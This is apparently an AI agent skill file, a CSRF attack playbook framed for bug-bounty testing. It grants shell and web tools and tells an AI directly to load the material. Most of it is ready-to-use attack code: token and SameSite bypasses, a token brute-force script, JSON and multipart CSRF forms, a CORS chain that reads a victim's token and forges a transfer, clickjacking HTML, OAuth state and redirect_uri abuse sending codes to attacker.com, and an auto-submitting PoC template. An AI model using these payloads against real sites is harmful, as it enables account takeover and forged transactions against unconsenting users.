---
name: csrf-cross-site-request-forgery
description: CSRF attack playbook — token bypass techniques, SameSite cookie bypass, JSON CSRF, multipart CSRF, CORS-based CSRF, CSPT2CSRF (client-side path traversal), clickjacking as CSRF, OAuth CSRF, and CSRF via subdomain takeover.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: CSRF — Cross-Site Request Forgery Attack Playbook

> **AI LOAD INSTRUCTION**: CSRF exploits the browser's automatic cookie inclusion to forge authenticated requests from the victim's browser. Covers all major CSRF protection bypass techniques including SameSite=Lax bypass, JSON CSRF, CORS misconfig chains, CSPT2CSRF, and OAuth state parameter abuse. Base models miss SameSite=Lax top-level navigation bypass and CSPT2CSRF entirely.

## 0. RELATED ROUTING

- csp-bypass-advanced — if CSP `form-action` is not set, CSRF exfil via form is possible
- open-redirect — combine with OAuth CSRF for token theft
- xss — CSRF becomes trivial when XSS is present

---

## 1. CSRF TOKEN BYPASS TECHNIQUES

### 1.1 Delete or Empty the Token

```http
POST /transfer HTTP/1.1
# Remove token entirely from request
# body: amount=1000&to=attacker
# (no csrf_token parameter at all)
```
Some servers check "if token is present, validate it" — missing token passes.

### 1.2 Use Same Token Across Accounts

```
1. Get valid CSRF token from your own account: TOKEN_A
2. Craft CSRF attack form using TOKEN_A
3. Victim submits → server validates TOKEN_A (which is YOUR token) → may accept
```
Occurs when server validates token exists and is well-formed, but doesn't tie it to session.

### 1.3 Swap Method (GET for POST)

```http
# If endpoint accepts both GET and POST:
GET /api/transfer?amount=1000&to=attacker HTTP/1.1
# CSRF token only required on POST, not GET
```

### 1.4 Change Content-Type

```http
POST /api/transfer HTTP/1.1
Content-Type: text/plain

{"amount":1000,"to":"attacker"}
```
If endpoint checks CSRF only for `application/x-www-form-urlencoded`, switching to `text/plain` bypasses it while still sending JSON.

### 1.5 Referrer-Based Validation Bypass

```
Target checks: if Referer contains "target.com" → valid
Bypass: host at attacker.com/target.com.attacker.com (Referer: https://target.com.attacker.com/)
Or: use null Referer (meta referrer policy, sandboxed iframe)
```

```html
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<form action='https://target.com/transfer' method='POST'>...">
```

### 1.6 Predict/Brute-Force Weak Token

If CSRF token is a short numeric value or timestamp-based:
```python
# Brute force short token: 4-digit = 10000 attempts
for i in range(10000):
    token = str(i).zfill(4)
    r = requests.post(url, data={'csrf': token, 'amount': '1000'})
    if 'success' in r.text: print(f"Token: {token}")
```

---

## 2. SAMESITE COOKIE BYPASS

### SameSite=Lax Bypass

**Rule**: SameSite=Lax blocks cross-site POST but allows cross-site GET for top-level navigation.

```html
<!-- Works: GET top-level navigation -->
<a href="https://target.com/logout" target="_blank">click</a>
<meta http-equiv="refresh" content="0;url=https://target.com/logout">
<script>location='https://target.com/logout'</script>
```

**Two-step attack** (bypass 2-minute Lax exception):
1. Force victim to `GET /login?next=/transfer` — creates new session cookie with SameSite=Lax
2. Within 2 minutes of cookie creation, Lax cookies are sent with cross-site POST (Chrome exception)

### SameSite=Strict Bypass (requires same-site origin)

Requires XSS or open redirect on any same-site subdomain:
```
target.com (strict cookie)
attacker-controlled: other.target.com (XSS or open redirect)

1. Get victim to visit: other.target.com/redirect?url=/transfer?amount=1000
2. Redirect goes to: target.com/transfer?amount=1000
3. Same-site → Strict cookies sent
```

### Subdomain Takeover for SameSite Bypass

Unclaimed subdomain → attacker takes over → now "same-site" with victim:
```
1. Find: subdomain.target.com → CNAME → victim.s3.amazonaws.com (unclaimed)
2. Register the S3 bucket → control subdomain.target.com
3. Host CSRF payload at subdomain.target.com
4. SameSite=Strict cookies included (same eTLD+1)
```

---

## 3. JSON CSRF

When an endpoint accepts JSON and the CORS policy is misconfigured:

### Method 1: `text/plain` with JSON body

```html
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Sends `Content-Type: text/plain` with body: `{"email":"attacker@evil.com","ignore":"="}`

If the server parses JSON regardless of Content-Type, it works.

### Method 2: Fetch with CORS Pre-flight (needs CORS misconfiguration)

```html
<script>
fetch('https://target.com/api/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```
Only works if `Access-Control-Allow-Origin: *` or reflects origin with `Access-Control-Allow-Credentials: true`.

### Method 3: Flash-based JSON CSRF (legacy)

Historical: Flash allowed arbitrary Content-Type with credentials.

---

## 4. MULTIPART CSRF

```html
<!-- Multipart/form-data doesn't require CSRF token on some endpoints -->
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="data" value='{"admin":true}'>
  <input type="file" name="file">
</form>
```

If JSON data endpoint also accepts multipart, CSRF may bypass token check.

---

## 5. CORS-BASED CSRF (CORS + CSRF CHAIN)

If CORS allows `Access-Control-Allow-Origin: *` on authenticated endpoints:

```html
<script>
// Step 1: Read victim's CSRF token
fetch('https://target.com/account', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    // Step 2: Extract CSRF token from response
    const token = html.match(/csrf_token" value="([^"]+)"/)[1];
    // Step 3: Use token for state-changing request
    return fetch('https://target.com/transfer', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: `amount=1000&to=attacker&csrf_token=${token}`
    });
  });
</script>
```

---

## 6. CSPT2CSRF (CLIENT-SIDE PATH TRAVERSAL TO CSRF)

Path traversal in the client-side routing causes the browser to make a request to a different endpoint.

**Setup**: Application has `fetch('/api/users/' + userId + '/avatar')` where `userId` comes from URL.

```
Victim visits: https://target.com/profile/../../transfer?amount=1000
→ App does: fetch('/api/users/../../transfer?amount=1000/avatar')
→ Resolves to: fetch('/transfer?amount=1000')
→ State-changing request with victim's cookies
```

**Discovery**: Find endpoints where user-controlled path segments are concatenated into fetch/XMLHttpRequest URLs.

---

## 7. CLICKJACKING AS CSRF

When CSRF token is properly protected but clickjacking is possible (missing X-Frame-Options / frame-ancestors):

```html
<style>
  iframe { opacity: 0.1; position: absolute; z-index: 1; width: 300px; height: 100px; }
  #decoy { position: absolute; z-index: 0; width: 300px; height: 100px; }
</style>
<div id="decoy">Click here to win a prize!</div>
<iframe src="https://target.com/transfer?amount=1000&to=attacker"></iframe>
```

The victim clicks the visible "prize" button but actually clicks the invisible iframe button at the same position.

---

## 8. OAUTH CSRF (STATE PARAMETER BYPASS)

### Missing `state` parameter

OAuth flow without `state` parameter → CSRF attack on account linking:

```
1. Attacker starts OAuth flow with their account: attacker clicks "Connect Google"
2. Gets OAuth authorization URL: https://google.com/oauth?client_id=X&redirect_uri=https://target.com/oauth/callback
3. Pauses before clicking "Allow" — grabs the authorization URL
4. Sends this URL to victim
5. Victim visits URL → Google redirects to target.com/callback?code=VICTIM_CODE
6. target.com links victim's account to attacker's Google account
7. Attacker logs in with Google → logs into victim's account
```

### Weak state parameter

```
state = base64(timestamp)   → predictable
state = md5(username)       → enumerable
state = ""                  → no validation
```

### CSRF via redirect_uri manipulation

```
Attacker modifies redirect_uri to their domain:
https://target.com/oauth?redirect_uri=https://attacker.com/steal
→ OAuth code sent to attacker instead of target
```

---

## 9. CSRF VIA SUBDOMAIN XSS

```
1. Find XSS on any subdomain of target.com
2. Host CSRF payload at the XSS endpoint
3. Victim's browser executes CSRF attack from subdomain context
4. SameSite cookies (Lax) are included (same-site = same eTLD+1)
```

---

## 10. CSRF TESTING CHECKLIST

```
□ Check for CSRF token on all state-changing requests (POST/PUT/DELETE/PATCH)
□ Remove token entirely → does request succeed?
□ Empty the token value → still validates?
□ Reuse your own CSRF token in victim's context
□ Switch Content-Type (form → text/plain or application/json)
□ Check SameSite attribute on session cookie
│   ├── SameSite=None → classic CSRF form works
│   ├── SameSite=Lax → try GET-based state changes, top-level navigation
│   └── SameSite=Strict → need same-site XSS or subdomain takeover
□ Check CORS headers → `Access-Control-Allow-Origin` + `Allow-Credentials`
□ Check OAuth flows for missing or weak state parameter
□ Check for CSPT in client-side fetch/XHR with user-controlled paths
□ Check frame-ancestors / X-Frame-Options → clickjacking fallback
```

---

## 11. CSRF PROOF-OF-CONCEPT TEMPLATE

```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF PoC</h1>
<form id="csrf-form" action="https://TARGET.COM/ACTION" method="POST">
  <input type="hidden" name="param1" value="value1">
  <input type="hidden" name="param2" value="value2">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

**For GET CSRF:**
```html
<img src="https://TARGET.COM/ACTION?param1=value1&param2=value2" width="0" height="0">
```
